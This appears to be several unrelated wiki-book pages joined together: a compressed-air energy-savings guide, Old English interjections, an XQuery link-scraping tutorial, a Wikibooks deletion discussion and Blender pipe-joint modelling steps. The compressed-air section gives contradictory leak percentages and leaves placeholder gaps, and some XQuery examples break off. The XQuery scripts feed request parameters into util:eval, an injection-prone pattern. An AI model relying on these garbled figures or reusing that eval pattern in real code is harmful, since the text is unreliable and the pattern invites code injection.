* Data Required
  - All Standard Air Compressor Data, including leak load. (See Section 3.)
* Tools Required
  - DMM or Ammeter or Power Analyzer
  - Air Compressor Data Worksheets
  - Measured Operating Conditions worksheets
  - Air Compressor Savings Worksheets

==Analysis Process:==
'''&lt;u&gt;1. Enter Existing Operating Conditions on Worksheets.&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods

'''&lt;u&gt;2. Calculate Peak Plant Load.&lt;u&gt;'''

The peak plant load is the peak production airflow minus air leaks.
* Plant Load = Peak Production Load - Leak Load

'''&lt;u&gt;3. Calculate Existing Leak Load as a percentage of the Peak Plant Load.&lt;u&gt;'''

The Leak Load Percentage relates the air lost to leaks to air used by the plant.
* Leak Load % = Leak Load / Plant Load

'''&lt;u&gt;4. Enter Proposed Leak Percentage&lt;u&gt;'''

A typical proposed leak load is 30% of plant load for a relatively leaky system, 2% is fairly average, and 10% is a tight, clean system. if the current leak load is at or below 30% of plant load, this recommendation is not likely to offer significant savings.
Calculate Proposed Leak Load:
* Proposed Leak Load = Plant Load x Proposed Leak Load Percentage

'''&lt;u&gt;5. Calculate Proposed Airflows for each operating load.&lt;u&gt;'''

* Proposed Airflow = Existing Airflow - Existing Leak Load %C + Proposed Leak Load %C

'''&lt;u&gt;6. Calculate Proposed energy use for each operating condition&lt;u&gt;'''

Calculate proposed energy use using proposed airflows. Also, see Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;7. Complete the Air Compressor Savings Worksheets for reduced air leaks.&lt;u&gt;'''

'''&lt;u&gt;8. Estimate implementation cost and determine payback&lt;u&gt;'''

Leaks typically arise faulty fittings, lines, valves, and hoses. These leaks are generally easy to repair, with little or no material cost. If pneumatic rams or cylinders are leaking, they will have to be rebuilt or replaced. Rebuild kits and labor may cost severally hundred dollars, depending on the size and location of the leak. Typically repairing leaks has a payback of less than one year.

==Recommendation #2 - Use Unload Controls==
'''Summary:''' Use low-unload or load-unload controls with a modulating compressor to increase the part load efficiency.

'''When to Apply:''' Modulating compressor have poor part load efficiencies. Any time a modulating compressor operates at a part load there may be an opportunity for savings with unloading controls. This recommendation applies best to modulating compressors operating at part load for a significant percentage of time. Sometimes the unloading controls are already present, but are not being used.

'''Key Engineering Concepts:'''
* Inlet and discharge pressure are reduced when a compressor unloads. Lower pressure result in lower power requirements, generally in the range of 20% of full load power when discharge pressure is reduced to atmospheric pressure.
* Unload controls allow an air compressor to unload when airflow drops or system pressure increases to a predetermined set point. 
* Successful implementation may require adding receiver capacity. The air system must also allow pressure variations up to 10 psi typically.

'''Preparation:'''
* Data Required:
  - All Standard Air Compressor Data. (See Section 3)
  - Proposed Unload Point and existing Unloaded Operation Conditions.

==Analysis Process:==
'''&lt;u&gt;1. Calculate Air Compressor Energy Use for Existing Operating Conditions.&lt;u&gt;'''

(See Section 5)

'''&lt;u&gt;2. Determine a Proposed Unload Point.&lt;u&gt;'''

Choosing an unload control strategy will determine the unloading point. Load-unload controls dictate a 100% Capacity Unload Point, while Low-Unload controls will have an unload point that is adjustable or set by the compressor manufacturer. The compressor manufacturer will quote both an Unloaded Power and a range for the Unload point. Use this information from the manufacturer or dealer to choose a proposed unload point and calculate proposed power for all operating conditions of interest.

'''&lt;u&gt;3. Calculate Proposed Power.&lt;u&gt;'''

Airflow will not change for any loads when adding unload controls. Calculate power for typical plant operating points using the appropriate formula.
* If airflow &lt; Unload Point (%C&lt;%CUL):
* Power = (Unload Point %P - Unloaded %P) x Load %C + No Load %P
If airflow is above the Unload Point, calculate power with the appropriate formula for the appropriate type of modulating controls. Refer to Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;4. Calculate Energy Use for Proposed Operating Conditions.&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;5. Determine energy savings.&lt;u&gt;'''

Use differences in proposed and existing Operating Conditions to calculate energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback.&lt;u&gt;'''

Costs for implementing this recommendation can include unloading controls, additional receiver capacity, and labor.

Prices for unloading controls vary from compressor to compressor. contact the manufacturer for their prices. Estimate $1,500 to retrofit, $700 option for a new compressor. 

Unload controls perform better if the system has adequate receiver capacity. The receiver must be large enough to allow the air compressor to stay unloaded for at least 2 minutes per cycle. To size system storage, a rule of thumb estimate is one gallon of storage for each CFM of peak airflow. Estimate $4/gallon of received capacity installed.

Alternately, you can get vendor quotes for receivers and estimate labor time and cost to install receivers. Many plants have maintenance crews that could install additional receivers. Generally, labor costs for outside contractors run $50 to $60 an hour with the installation requiring from 5 to 10 hours.

==Recommendation #3 - Reduce System Pressure ==
'''Summary:''' Power is required to compress air atmospheric pressure to system pressure. A lower system pressure will require less power per CFM. Set compressors to the lowest possible pressure required by plant equipment, plus line losses between the air compressors and equipment.

'''When to Apply:''' This recommendation applies when system pressure is significantly greater than required by end-uses. There may be pressure-regulators on some equipment to limit pressure. If the pressure drop across regulators is significant, reduce system pressure. This may required segregating end uses by pressure requirements.

'''Key Engineering Concepts:'''
* Compressor power decreases approximately 1/2% for each psi reduction in discharge pressure.
* With reduced system pressure, air lost to regulated air uses is reduced by approximately 3/4% per psi.
* The minimum pressure for oil separators is typically 80 psi but it varies from compressor to compressor.

'''Preparation:'''
* Data Required
  - All Standard Air Compressor Data. (See Section 3.)
  - System Operating Pressure
  - Minimum required pressure
* Tools required
  - DMM
  - Air Compressor data sheets

==Analysis process:==
'''&lt;u&gt;1. Calculate Air Compressor Power for Existing Operating Conditions&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;2. Determine Proposed Full Load Power with reduced pressure.&lt;u&gt;'''

Full load motor power decreases by reducing pressure differential across the compressor.
* Full Load Power = Existing Full Load Power x ((ln(proposed pressure/atmospheric pressure))/(ln(existing pressure/atmospheric pressure)))

'''&lt;u&gt;3. Calculate Reduction in Airflow&lt;u&gt;'''

By reducing system there will be less airflow to most loads, including leaks.
* Proposed Airflow = Existing Airflow x (Proposed Pressure + Atm. Pressure)/(Existing Pressure + Atm. Pressure)

'''&lt;u&gt;4. Calculate Air Compressor Energy Use for Proposed Operating Conditions&lt;u&gt;'''

See Section 5. Analysis Tools &amp; Methods.

'''&lt;u&gt;5. Determine Energy Savings&lt;u&gt;'''

Use differences in proposed and existing Operating Conditions to calculate energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback&lt;u&gt;'''

Implementation for this recommendation is often negligible, as the only requirement is to adjust the pressure of the compressor. However, if excessive system losses require high pressure then the implementation cost will include correcting this situation.

==Recommendation #4 - Replace Air Dryer==
'''Summary:'''Industrial processes require varying amounts and dryness of dried air. Several ypes of air dryers exist that dry air to varying dew points using different methods.

'''When to Apply:''' Dry air only to a minimum dew point required for plant operations. When the volume of air being dried or dryness is beyond what is required, there is an opportunity for savings.

'''Key Engineering Concepts:'''
Atmospheric air contains water vapor. When compressed air cools, this vapor condenses and causes problems with corrosion and air uses that are sensitive to water. Drying air is an energy intensive process.

?????????

*Data Required
  - All Standard Air Compressor Data. 
  - Type of air dryer
  - Air Dryer Energy Use
  - The Required dew point for plant air
* Tools Required 
  - DMM
  - Air Compressor data sheets

==Analysis Process==
'''&lt;u&gt;1. Estimate Existing air dryer operating costs.&lt;u&gt;'''

Air dryers are expensive to operate and maintain. Costs arise from a number of sources. Calculate the cost of each of the following:

&lt;u&gt;Direct Energy Requirements (DER)&lt;u&gt;
Refrigerated dryers use energy to cool the compressed air. Heated desiccant dryers use energy to heat the compressed air used to purge the desiccant beds. Calculate refrigeration and heating energy by measuring and recording volts and amps or power being used by the dryers.

&lt;u&gt;Pressure Drop(PD)&lt;u&gt;
Air Dryers introduce a pressure drop to the air system that costs an extra 1/2% power from the comrpessor for each psi of pressure drop. Refrigerated air dryers will induce a pressure drop of about 5 psi. Desiccant air dryers cause a negligible pressure drop. Membrane air dryers will have a pressure drop of about (I am still looking for this). If gauges are available, compare pressures before and after the air dryer to determine pressure drop.

&lt;u&gt;Air to Regenerate Desiccant Tanks (PA)&lt;u&gt;
Desiccant air dryers use dry air to regenerate the desiccant beds. Heated dryers heat the compressed air before passing it through the beds, while others pass unheated dry air through the beds. The added energy required to heat the air is more than offset by the amount of compressed air saved. The cost of compressed air used to regenerate desiccant beds can be calculated by estimating the airflow (acfm) required to regenerate, and referring to Section 5. Analysis Tools &amp; Methods.

Purge frequency can be controlled by two means: capacity control (constant time interval); or moisture control.

Capacity control diverts a portion of the dried compressed airflow through the desiccant beds, usually for a fixed time interval. Then, the regenerated desiccant bed is switched on line while the other bed is regenerated.

The moisture (humidity) sensor initiates regeneration when a set level of moisture is reached in the desiccant bed, and can also terminate regeneration when the bed is dry. This type is generally more efficient as only the amount of dry air required is used. Estimate the regeneration airflow by observing the time that the desiccant beds are being regenerated and from manufacturer's specifications.

&lt;u&gt;Replacing Desiccants and Filters (CP)&lt;u&gt;
Desiccant dryers require periodic replacement of desiccant material. Depending on the quantity and frequency of replacement this cost can be substantial. Plant personnel might have records of how often the desiccant is replaced.

&lt;u&gt;Maintenance Requirements (MR)&lt;u&gt;
Membrane type dryers claim to be virtually maintenance free. Refrigerated and desiccant dryers all have parts that can wear and will need maintenance. The plant personnel should be able to estimate maintenance requirements.

The total cost of drying air is the sum of the following costs:
* Direct Energy
* Pressure Drop
* Regeneration Air
* Consumable Parts
* Maintenance

'''&lt;u&gt;2. Determine appropriate Dew Point.&lt;u&gt;'''

In mild climates it is not often enough where airlines are exposed to outdoor temperatures to require dew points below about 35 degrees to 50 degrees F. However, some locations and applications do require dryer air. Ask Plant personnel about how dry the air needs to be. If they are drying the air much below 35 degrees F confirm that they really require air that dry. if there are only one or two pieces of equipment that require extremely dry air consider isolating those air uses.

'''&lt;u&gt;3. Choose appropriate air dryer.&lt;u&gt;'''

Use catalogs and distributors to select an appropriate air dryer. Estimate the operating costs for that dryer. Estimate the energy required by a new dryer from manufacturer's  specifications. Available types of air dryers vary in cost and ability to dry air. Following is a brief guide to the operating costs and capabilities of various air drying methods.

Refrigerated Air Dryers are usually the best option for plants without extreme drying requirements. Refrigerated dryers are effective for drying air down to 35 degrees - 50 degrees F.

Desiccant Air Dryers are required for dew points below 35 degrees F. The most efficient desiccant air dryers include capacity controlled regeneration and a system to heat the dry air before regeneration.

Membrane Air Dryers are capable of reaching similar dew point to refrigerated dryers however they cause a larger pressure drop through the membrane.

'''&lt;u&gt;4. Determine energy savings.&lt;u&gt;'''

Calculate differences in proposed and existing Operating Conditions to determine energy and dollar savings.

'''&lt;u&gt;5. Estimate implementation cost and determine payback.&lt;u&gt;'''

Implementation cost includes the air dryer and installation. Rough installed costs/ 1000 SCFM are:
* Refrigerated air dryer - $10,000
* Heated Regenerative air dryers - $25,000
* Heater-less Regenerative air dryer -= $12,500

==Recommendation #5 - Isolated Air Uses==
'''Summary:'''Often plants have one large air compressor providing air to all applications. Isolating high pressure, high hour or particularly low moisture requirements form the main air system can save energy.

'''When to Apply:''' When one appplication dictates the pressure, drying requirement, and/or the operating hours for the compressed air system while all of the other uses could be met with lower pressure air, fewer operating hours, or less energy intensive air drying processing.

'''Key Engineering Concepts:'''
Power and energy are proportional to the pressure difference. Stringent drying requirements are expensive to maintain.

'''Preparation:'''
* Data Required
  - All Standard Air Compressor Data. (See Section 3)
  - Required Airflow, Pressure and Operating Hours of processes that can be isolated.
* Tools Required
  - DMM
  - Air Compressor data sheets

==Analysis Process==
'''&lt;u&gt;1. Identify Processes that may be isolated from the main plant air system&lt;u&gt;'''
Any time there is a plant process that requires higher pressure air, dryer air, or more operating hours than the rest of the plant there is an opportunity to isolate that process.
Examples are:

  - Fire Suppression Systems
    -In dry fire suppression systems large plant air compressors are often employed to keep the pipes charged with compressed air. This requires that the compressors be left on all the time although fire systems generally require no airflow. During non-production periods the air compressors may only be supplying leaks. By isolating fire systems the large plant air compressor can be turned off during down time, while a small air compressor can maintain fire system pressure.

  - Paint Booths
    -Painting applications generally require low pressures. If this pressure is significantly lower than that required for the rest of the plant, consider isolating the paint booth. use one air compressor to fulfill the low-pressure requirements of the paint booth and another to fulfill the higher pressure demands of the rest of the plant is often a good idea.

  - Dry air
    -Some material handling systems or painting applications require dryer air than the rest of the plant. Isolating these uses and only stringently dry the air that requires it.

Calculate the energy savings for the air system.

Savings result from reducing pressure, switching to less expensive air-drying, and reducing run time. If reducing pressures, refer to the Reduce Pressure recommendation guide. Id changing air-drying requirements, refer to Replace air dryer recommendation guide. If reducing run time, use the calculations below.

&lt;U&gt;Calculate Energy Savings from Reducing Run Time&lt;u&gt;
  - Energy Savings = Operating Power x Saved Hours
  - ES = D x SH

'''&lt;u&gt;3. Estimate the required airflow, pressure and operating hours of the isolated process.&lt;u&gt;'''

'''&lt;u&gt;4. Size an appropriate new compressor to meet the isolated loads.&lt;u&gt;'''
Air compressor manufacturers publish specifications in both ACFM and pressure. To size a compressor, select one that meets the isolated load pressure and airflow requirements, or refer the requirements to a manufacturer or vendor. to be conservative in your savings estimates assume the compressor will operate at rated power, even thought this will not always be the case. If the compressor is to be used to pressure in a fixed volume of pipes. With small or no leaks in the pipes, the compressor will used little or no energy. If the compressor is to be used to run a paint booth you will need to find out pressure and airflow requirements. Use this information to estimate compressor energy use.

&lt;u&gt; Calculate Energy Use for a new compressor&lt;u&gt;
  - Energy Usage = Rated Power x Operating hours x Use Factor x Load Factor
  - E = P x OH x UF x LF

'''&lt;u&gt;5. Determine energy savings&lt;u&gt;'''
Calculate differences in proposed and existing Operating Conditions to determine energy and dollar savings.

'''&lt;u&gt;6. Estimate implementation cost and determine payback.&lt;u&gt;'''
The implementation cost includes purchase and installation of a new air compressor. Obtain these costs from a compressor manufacturer or dealer.

      <text xml:space="preserve">{{Old English}}
'''Interjections''' are words used to express an emotion. The most common Old English interjections were:

* Ēa - oh
* Ēalā - lo, oh (also said when seeing someone - like an acknowledgement)
* Hwæt - what!
* Lā （frequently used in combination with other words or interjections - see &quot;ēalā&quot; above) - lo
* Wā - woe!, misery!
* Wel, wel - well, well

Oh particular interest is the interjection &quot;lā&quot;, which could be used in the middle of a sentence to emphasize almost anything being said, including statements, questions, requests, and commands. For example:
*Cum lā! - Come on!
*Ġief mē þā bōc lā - Please give me the book
*Saga lā þætte þū þenċest - Do say what you're thinking
*Hwæt lā is þæt? - Whatever is that?
*He is lā wel grēat - He is indeed tall

They didn't really have exact equivalents for short words for &quot;please&quot; and &quot;sorry&quot; in Old English, but &quot;lā&quot; could at a pinch be used in a request for &quot;please&quot; (see above). Also, one could use the interjection &quot;wālā&quot; or &quot;wālāwā&quot; to express sorrow or regret - approximately equivalent of &quot;sorry&quot;.

You want to gather the links on a blog page.

== Method ==
We use the '''doc()''' function to perform an HTTP GET on a remote web page.  If the page is a well formed XML file you can then extract all the unorder list items by adding a ul predicate to the doc function.



This script fetches the blog page and selects the urls in the link section, which reference other blog articles.  Each referenced article is fetched and the urls marked as external are selected. The result is returned as XML.

&lt;source lang=&quot;xml&quot;&gt;

Dropping the intermediate variables allows the structure to be seen more clearly:

== Repository Schemas ==

Daniel is proposing a standard for supporting the extraction of data such as this from a site. Such a schema would define a view of a set of documents sufficient to allow the extraction above to be based on the schema.

We can go some way towards this with a view schema represented as an ER model, with added implementation-dependent paths. 


&lt;source lang=&quot;xml&quot;&gt;
&lt;model  name=&quot;blog-links&quot;&gt;
    &lt;type name=&quot;url&quot; datatype=&quot;string&quot;/&gt;
    &lt;entity name=&quot;page&quot;  &gt;
        &lt;attribute name=&quot;inner&quot;  max=&quot;N&quot;   path=&quot;//q:ul[@class='portletNavigationTree navTreeLevel0']//@href&quot;  type=&quot;page&quot;/&gt;
        &lt;attribute name=&quot;external&quot; max=&quot;N&quot;  path=&quot;//q:div[@id='content']//q:a[@title='external-link']/@href&quot;  type=&quot;url&quot;/&gt;
     &lt;/entity&gt;
&lt;/model&gt;
&lt;/source&gt;

This schema can then be used by a generic script link gathering script:

&lt;source lang=&quot;xml&quot;&gt;
let $start := request:get-parameter(&quot;page&quot;,())
let $view := request:get-parameter(&quot;view&quot;,())
let $schema := doc($view)
let $inner := $schema//entity[@name='page']/attribute[@name='inner']/@path 
let $external := $schema//entity[@name='page']/attribute[@name='external']/@path  
return
&lt;results&gt;
{
       for $page in util:eval(concat('doc($start)',$inner))
       for $link in util:eval(concat('doc($page)',$external))
       return      
         &lt;link&gt;{string($link)}&lt;/link&gt;
}
&lt;/results&gt;

&lt;/source&gt;

This script now performs the task of link gathering on any site whose page structure can be defined in terms of the schema with appropriate paths.

== Relative and absolute URIs ==

The previous version works only if the URIs are absolute.  A little more work is needed if not:

&lt;source lang=&quot;xml&quot;&gt;
declare namespace q = &quot;http://www.w3.org/1999/xhtml&quot;;

declare variable $start := request:get-parameter(&quot;page&quot;,());
declare variable $view := request:get-parameter(&quot;view&quot;,());
declare variable $schema := doc($view);
declare variable $base :=  substring-before($start,local:local-uri($start));

declare function local:local-uri($uri) {
  if (contains($uri,&quot;/&quot;))
  then local:local-uri(substring-after($uri,&quot;/&quot;))
  else $uri
};

declare function local:absolute-uri($url) {
   if (starts-with($url,&quot;http://&quot;))
   then $url
   else concat($base,$url)
};

let $inner := $schema//entity[@name='page']/attribute[@name='inner']/@path 
let $external := $schema//entity[@name='page']/attribute[@name='external']/@path  

let $starturi := local:absolute-uri($start)
return
&lt;results&gt;

{
       for $page in util:eval(concat('doc($starturi)',$inner))
       let $pageuri := local:absolute-uri($page)
       for $link in util:eval(concat('doc($pageuri)',$external))
       return      
         &lt;link&gt;{string($link)}&lt;/link&gt;
}
&lt;/results&gt;


&lt;/source&gt;

So with a different schema - same model, different paths:

&lt;source lang=&quot;xml&quot;&gt;
&lt;model name=&quot;site-links&quot;&gt;
    &lt;type name=&quot;url&quot; datatype=&quot;string&quot;/&gt;
    &lt;entity name=&quot;page&quot;  &gt;
         &lt;attribute name=&quot;inner&quot; max=&quot;N&quot; path=&quot;//div[@class='nav']//a/@href&quot; type=&quot;page&quot;/&gt;
        &lt;attribute name=&quot;external&quot; max=&quot;N&quot; path=&quot;//div[@class='content']//a/@href&quot; type=&quot;url&quot;/&gt;
    &lt;/entity&gt;
&lt;/model&gt;
&lt;/source&gt;

which is a view schema of this   [http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/test1.html test site]

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/urlDiscover6.xq?page=http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/test1.html&amp;view=/db/Wiki/Gov/site.xml  Execute]


== Virtual Paths ==

The navigation path is still hard-coded in the script.  We would like to write path expressions where the steps are defined in the schema.  This path would then be interpreted in the context of the schema.  

=== View Schema ===

In this example, the test site has been expanded to include a separate index page and some additional components in the view:
&lt;source lang=&quot;xml&quot;&gt;
&lt;model name=&quot;site-links&quot;&gt;
    &lt;entity name=&quot;externalPage&quot;&gt;
        &lt;attribute name=&quot;title&quot; path=&quot;/head/title&quot;/&gt;
    &lt;/entity&gt;
    &lt;entity name=&quot;index&quot;&gt;
        &lt;attribute name=&quot;link&quot; max=&quot;N&quot; path=&quot;//div[@class='index']//a/@href&quot; type=&quot;page&quot;/&gt;
     &lt;/entity&gt;
     &lt;entity name=&quot;page&quot;&gt;
        &lt;attribute name=&quot;title&quot; path=&quot;//head/title&quot;/&gt;
        &lt;attribute name=&quot;inner&quot; max=&quot;N&quot; path=&quot;//div[@class='nav']//a/@href&quot; type=&quot;page&quot;/&gt;
        &lt;attribute name=&quot;external&quot; max=&quot;N&quot; path=&quot;//div[@class='content']//a/@href&quot;
        type=&quot;externalPage&quot;/&gt;
         &lt;attribute name=&quot;author&quot; min=&quot;0&quot; path=&quot;//div[@class='content']/span[@class='author']&quot;/&gt;
    &lt;/entity&gt;
&lt;/model&gt;

&lt;/source&gt;

=== Path language ===

This prototype uses a simple path language.The step -&gt; dereferences a relative or absolute URL.  Where a step is recognised as an attribute of the current entity, the associated path expression is used, otherwise the step is executed as XPath.  The first step identifies the (entity) type of the initial document. 

For example:
==== index/link/-&gt;/title ====
List the titles of the pages in the index. 

&lt;source lang=&quot;xml&quot;&gt;

import module namespace vp =&quot;http://www.cems.uwe.ac.uk/xmlwiki/vp&quot; at &quot;../Gov/vp.xqm&quot;;

let $uri := &quot;http://www.cems.uwe.ac.uk/xmlwiki/Gov/site/index.html&quot;
let $schema := &quot;/db/Wiki/Gov/site3.xml&quot;
return
  &lt;result&gt;
  {vp:process-path($uri,&quot;index/link/-&gt;/title&quot;,$schema) }
  &lt;/result&gt;

&lt;/source&gt;

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/test1.xq Run]

==== index/link/-&gt;/author/string(.) ====
List the authors of the pages referenced in the index. 

&lt;source lang=&quot;xml&quot;&gt;
import module namespace vp =&quot;http://www.cems.uwe.ac.uk/xmlwiki/vp&quot; at &quot;../Gov/vp.xqm&quot;;

  &lt;/result&gt;

&lt;/source&gt;

[http://www.cems.uwe.ac.uk/xmlwiki/Gov/test2.xq Run]

==== page/inner/-&gt;/external ====

List the url of all distinct external links of all pages referenced by the index page.

: [[Image:Symbol keep vote.svg|15px]] '''Keep''' - It is not redundant, as is informs people on the need of keeping a record of discussions on project, not where parallel discussion or talks can take place, like [[Wikibooks:Contact us]]. It also provides a information against group think, alliance forming and overall problems that can be exacerbate the dilution of how consensus is applied on Wikibooks. I don't see this information replicated in any other informational, policy or guideline text, this probably isn't the best place but the content it holds is useful...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 18:43, 29 January 2009 (UTC)
:: I've [http://en.wikibooks.org/w/index.php?title=Wikibooks:Contact_us&amp;diff=1400249&amp;oldid=1388949 added] a mention that IRC conversations are not archived and a suggestion that discussions be left on-wiki for the benefit of others. Would this be an acceptable compromise?
:: I see where you're going with your wish to keep in a &quot;group think&quot;/&quot;alliance forming&quot;/&quot;consensus forming&quot;-clause. You have previously made [http://en.wikibooks.org/w/index.php?title=Wikibooks:Reading_room/Administrative_Assistance&amp;diff=1383261&amp;oldid=1383221 allegations] that others have set you up and have had repeated Don Quixote-escue battles with the community. This page, however, has no such language and was furthermore created by an administrator deep in the heart of this nest of conspirators.
:: I agree, however, that an essay on practices that encourage an inclusive community and discourages [[w:clique]]s could be useful. Feel free to start one. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 02:52, 8 February 2009 (UTC)
:::Whatever you like, I have become very weary of unexplained and unexpected coincidences especially if fallowed by overblown reactions or 180 degrees changes of intentions.
:::We should provide the info that makes it clear that off wiki discussions about a non present party, his actions and consequences, aren't productive, useful and can even be amoral since said third party can't defend his opinion in equal grounds (this is valid even in any second channel, not only IRC), nor a valid log to the discussion, and yes it promotes building of groups, clique (whatever name you see best, I'm not establishing that the root cause is bad intentions), just because once something is said and no due process is done to examine those allegations, it becomes a fact in the minds of those that shared the info, sadly this is true and a known effect it is used by the media and marketing as a tool to form and shape actions. It is also recognized as bad practice in society, as talking one someone's back. 
:::Also it is especially interesting to me that the creator of the text is WK and I call your attention to the timeline. It seems related to the fact that a situation occurred on those specific lines. Not the first, since you are working on the fork policy something on those lines happened there also (even if we have logs of discussions on project) the fact is that a unlawful forced merge was allowed to proceed without any real info been retained on project besides my objection to the ex-admin that implemented it...
:::Using other channels to establish a majority or as a way to use peer pressure, so to establish acceptable behavior on project should be frown upon. I have called attention in the past to how easy it is to a group (coordinated or not) to control and mold the future of the project, just because how the decission process is being used, it discards the block of the decission as a possible outcome, that is, put simply, minority views aren't really recognized, liked or taken as something that should be considered or promoted. This is especially true if there is only one party opposing (most project decisions are made by 4 to 10 users), if someone disagrees to something he/she is a troll a crackpot or is &quot;disturbing&quot; the community, examples of this stance by the active majority are numerous. From the top of my head the issues of games guides, removing admin flags, book names, fork, user blocks, arbitration processes, all this processes/discussions or voices opposing the adopted formula were ignored or discarded, or overly stated as closed issues, alienating some Wikibookians in the process. If we are really attempting to get people to participate, fallow consensus as the decission process we should address and respect other peoples ideas, even if we don't agree with them, for the projects benefit they should be at least be considered.
:::I have yet to see any discussion process on Wikibooks (even the VfD) were a Wikibookian could be attributed bad intentions.
:::If you really thing removing this text form its present location is a benefit on a structural level please consider my vote as changed and I request that the page be moved to my userspace in place of losing it (due to historical relevance at least to me), since it is GFDL and has no objectionable content I don't see it as problematic, put it here [[User talk:Panic2k4/CrossTalk]] I'll try to build on it an '''Essay on using back channels to promote hegemony '''.   --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 05:33, 8 February 2009 (UTC)

An even more random collection of information, also redundant to [[Python Programming/Arrays]], [[Python Programming/Variables and Strings]], and [[Python Programming/Strings]]. [[User:Mr.Z-man|Mr.Z-man]] ([[User talk:Mr.Z-man|talk]]) 03:48, 10 February 2009 (UTC)
:[[Image:Symbol comment vote.svg|15px]] '''Comment'''  Instead of requesting its deletion, why don't you improve the article? I was going to print the whole book, but this deletion template stopped me. Consider my vote as a {{Keep|keep}}, as well for above, just to see this template removed and because I'm a Python begineer who wants to print tutorials.

::Why improve it when the information is already presented better in the other pages that I linked? I'm trying to improve the book in general, which includes removing unnecessary redundant parts. [[User:Mr.Z-man|Mr.Z-man]] ([[User talk:Mr.Z-man|talk]]) 00:24, 15 February 2009 (UTC)
:: In the case of [[Python Programming/Using variables and math]] which is also up for deletion, the content on that page was completely redundant with other pages. I haven't had time to go through the pages for this nomination, but I suspect that the same is true. You can help by checking whether there is any content on this page which is not covered on the others which Mr. Z-man linked to in the nomination. Thanks, and happy editing! --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 01:29, 15 February 2009 (UTC)

How to model pipe joints. 

== T joint ==
Start in top view, and delete the cube.

[[Image:Blender3D Roehrenabzweig.png|right|150px|'''Figure 1:''' Modeling a simple T joint.]]

* Add a cylinder object (''Add-&gt;Mesh-&gt;Cylinder'')
* 16 Vertices, No Caps, Depth 4 (For recent versions of Blender create the cylinder then press F6 to get these options)
* Switch to front view (''View-&gt;Front or NUM1''). 
The X axis now points to the right. We will work along the X axis from now on. 

* Change to Edit mode (TAB).
* Create a Loop Cut in the middle of the cylinder ('''Ctrl-R''').
Make sure that the 3D cursor is placed in the middle of the cylinder.





* Switch to right view ('''NUM3''')
* Box select ('''BKEY''') the 7 vertices at the front (Tip: tick the ''Occlude background geometry'' button)









* Switch back to front view ('''NUM1''')
* ''Pivot -&gt; 3D Cursor'' ('''.KEY''')
* Scale with the X axis ('''S-X'''), about 1.4142 (square root of 2).










* Rip the mesh with '''V'''.
* There will be 7 overlapping vertex pairs: 7 vertices linked to the top half of the tube, and 7 vertices linked to the bottom half of the tube.
* Either the upper vertices or the lower vertices should be selected.  Depending on which set of vertices is now selected you will need to rotate by -45 (upper) or +45 (lower).
* Once you have rotated the first set, deselect all ('''AKEY'''), then box select the other half of the opening
* Rotate the selected vertices by +/- 45 degrees.  The pipe should now be straight again thanks to the rotations.







* Box select the vertices of the gap and extrude &quot;edges&quot; along the X axis. 













* ''Pivot -&gt; Median Point'' ('''CTRL+,KEY''')
* To flatten the front: scale at the X axis by factor 0. ('''S-X''', '''0''').












* Use the ''Subsurf'' modifier in combination with ''Set Smooth'', ''LoopCuts'', and ''Crease'' to get a nice transition.

== 6 cylinder joint ==
[[Image:Blender3D 6TubesJoint.png|right|200px|'''Figure 2:''' 6 cylinder joint]]
Be in Object mode (have nothing else selected)

Add a cube.

Switch to Edit mode

Select all, then Subdivide the cube once ('''W''', '''1''') ('''1''').

Select the 12 vertices in the middle of the cube's edges.

Scale by factor 1.4142 (press '''S''' key and type in the factor with the keypad)  ('''2''').


Select all vertices, and Extrude &quot;Individual Faces&quot; (This can be done either on the Tool Shelf under &quot;Add&quot; or you can type '''Space''' and search for Extrude Individual Faces and Move.) ('''3''').

Select all vertices, and ''Remove Doubles''.




Select the center vertex of each tube, and delete them to open the ends


Select the original vertices in the middle of the object and delete them ('''5''').



Clean your mesh as described above.

{{clr}}

== 3 cylinder joint ==
[[Image:Blender3D 3TubesJoint.png|right|201px|'''Figure 3:''' 3 cylinder joint]]
This is very similar to above, only the selection for scaling is different.
* Select the middle vertices at the edges where the cylinders shall come from. Additionally select the middle vertices at the faces that shall be kept free. You have to select 12+3=15 vertices.
* Scale your selection by 1.4142.
* Select the faces that shall be extruded.
* ''Extrude-&gt;Individual Faces'' ('''5''')
* Select all, then ''Remove Doubles''.
* Delete the inner vertices ('''6''', '''7''').
* Select 3 vertices (which were middle of faces that were kept free) and 1 corner vertex in middle of the free faces ('''8''').
* Make sure your 3D cursor is at the origin (and that you added the cube at the origin)
and switch to 3D Cursor Pivot ('''.KEY''' in v2.49b), then scale ('''SKEY'''), and type in 0.7071 (inverse of square root of 2, or Sin(45 degrees) or Cos(45 degrees)) and '''ENTER'''
('''9''').
* Make sure you switch back to Median Point Pivot ('''SHIFT'''+''',KEY''') to straighten out pipe ends ('''10''').

Clean your mesh as described above.


If your joint looks odd, it might be because of some edges in the mesh. Delete those by selecting it and delete ('''XKEY''') edges (not vertices).

== T joint with smaller diameter ==
[[Image:Blender3D LargeSmallTube.png|framed|'''Figure 4a:''' Basic structure for a T joint with a smaller diameter]]
[[Image:Blender3D LargeSmallTubeResult.png|framed|'''Figure 4b:''' The result]]
We're going to create a structure like in '''Fig.&amp;nbsp;4a''' and extrude the inner circle. To do that we place a circle with ''Retopo'' ([http://wiki.blender.org/index.php/Doc:Manual/Modelling/Meshes/Remaking_the_Tolopogy Manual]) on the cylinder and join both objects afterwards.

* ''Add-&gt;Mesh-&gt;Cylinder''
** 8 vertices (of course you can use more vertices if you like)
** ''No Caps''
** ''Depth 4''
